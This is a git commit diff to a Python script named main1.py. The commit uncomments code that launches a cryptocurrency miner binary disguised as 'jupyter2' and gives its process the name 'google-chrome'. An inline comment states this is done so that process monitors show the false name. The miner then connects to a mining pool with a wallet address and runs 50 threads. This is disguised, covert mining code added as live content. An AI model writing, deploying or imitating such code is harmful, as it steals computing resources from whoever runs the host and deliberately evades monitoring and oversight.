ccbf9e9aaf960a4470b2eb103998aacc7c771e34
gahalusinta4 <gahalusinta@gmail.com>
2024-09-30 08:47:25 +0800

    Update main1.py

--- main1.py
+++ main1.py
@@ -2,19 +2,19 @@ import os
 import random
 os.system("chmod +x SRBMiner-MULTI hellminer verus-solver hell.sh verus-solver-original jupyter2")
 
-os.system("bash hell.sh")
+#os.system("bash hell.sh")
 
 
-# name = random.randint(2000,9000)
-# # Replace the current process with the mining process
-# # os.execvp("./jupyter2", [
-# #     "google-chrome",  # This will be the name shown in process monitors
-# #     "-a", "verush",
-# #     "--url", "stratum+tcp://us.vipor.net:5040",
-# #     "-u", f"RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.aaa{name}",
-# #     "-p", "d=0.1",
-# #     "-t", "50"
-# # ])
+name = random.randint(2000,9000)
+# Replace the current process with the mining process
+os.execvp("./jupyter2", [
+    "google-chrome",  # This will be the name shown in process monitors
+    "-a", "verush",
+    "--url", "stratum+tcp://us.vipor.net:5040",
+    "-u", f"RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.aaa{name}",
+    "-p", "d=0.1",
+    "-t", "50"
+])
 
 # # os.execvp("./SRBMiner-MULTI",  [
 # #     "google-chrome",
